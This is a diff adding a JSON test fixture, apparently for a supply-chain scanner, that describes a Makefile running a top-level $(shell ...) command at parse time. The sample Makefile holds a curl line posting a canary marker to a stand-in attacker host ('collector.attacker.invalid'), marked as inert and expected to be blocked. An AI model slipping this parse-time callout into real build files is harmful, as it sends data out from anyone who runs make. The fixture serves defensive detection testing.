@@ -1,0 +1,19 @@
+{
+  "id": "makefile-shell-download-run",
+  "title": "Makefile evaluates $(shell ...) that downloads and runs code",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "build",
+  "technique": "A top-level $(shell ...) assignment is evaluated as soon as make parses the Makefile (including by editor tooling), running a command before any target is chosen.",
+  "trigger": "Running make, or tooling that parses the Makefile",
+  "incident": "Makefile $(shell ...) execution (Bagmar & Saraf setup-doc execution class)",
+  "sources": [
+    "https://arxiv.org/abs/2607.15143"
+  ],
+  "notes": "The $(shell) command only echoes PAH-CANARY; the curl targets a reserved .invalid host and fails closed.",
+  "files": {
+    "Makefile": "# PAH-CANARY fixture: top-level shell expansion runs at parse time. Inert.\nBOOT := $(shell sh -c 'curl -s --data marker=PAH-CANARY https://collector.attacker.invalid/u >/dev/null 2>&1 || true; echo PAH-CANARY')\n\nall:\n\t@echo building $(BOOT)\n",
+    "src/main.c": "int main(void){return 0;}\n",
+    "README.md": "# cproj\n\nC project. Run `make`.\n"
+  }
+}
